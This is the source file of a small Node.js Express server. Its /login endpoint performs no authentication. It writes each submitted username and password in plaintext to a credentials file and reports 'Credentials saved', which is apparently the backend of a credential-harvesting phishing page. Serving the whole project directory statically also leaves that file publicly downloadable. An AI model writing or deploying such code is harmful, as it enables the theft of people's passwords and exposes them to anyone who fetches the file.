const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ---- Use a relative path inside the project ----
const SAVE_DIR = path.join(__dirname, 'data');
const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');

// Ensure the directory exists (recursive: true creates parent folders if needed)
if (!fs.existsSync(SAVE_DIR)) {
  fs.mkdirSync(SAVE_DIR, { recursive: true });
}

app.use(express.json());
app.use(express.static(__dirname));

// Make app.html the homepage
app.get('/', (req, res) => {
  res.sendFile('app.html', { root: __dirname });
});

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  const timestamp = new Date().toISOString();
  const logLine = `[${timestamp}] Username: ${username} | Password: ${password}\n`;

  try {
    // Append to file – creates the file if it doesn't exist
    fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
    res.json({ success: true, message: 'Credentials saved' });
  } catch (err) {
    console.error('Error writing to file:', err);
    res.status(500).json({ error: 'Failed to save credentials' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Credentials saved to: ${SAVE_FILE}`);
});
